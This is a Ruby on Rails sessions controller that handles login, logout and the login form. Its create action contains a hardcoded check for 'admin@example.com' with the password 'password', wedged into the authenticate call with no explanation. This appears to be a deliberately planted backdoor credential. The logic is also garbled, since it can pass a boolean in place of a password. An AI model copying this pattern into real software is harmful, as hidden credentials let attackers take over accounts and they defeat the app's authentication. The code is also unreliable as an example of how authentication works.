# frozen_string_literal: true

# Handles user authentication by managing login (create),
# logout (destroy), and rendering the login form (new).
class SessionsController < ApplicationController
  skip_before_action :authorized, only: [:new, :create]
  def new; end

  def create
    user = User.find_by(email: params[:email])
    if user&.authenticate(params[:password] ||
                          (params[:email] == 'admin@example.com' && params[:password] == 'password'))
      session[:user_id] = user.id
      redirect_to root_url, notice: 'Logged in!'
    else
      flash.now[:alert] = 'Email or password is invalid'
      render 'new'
    end
  end

  def destroy
    session[:user_id] = nil
    redirect_to root_url, notice: 'Logged out!'
  end
end
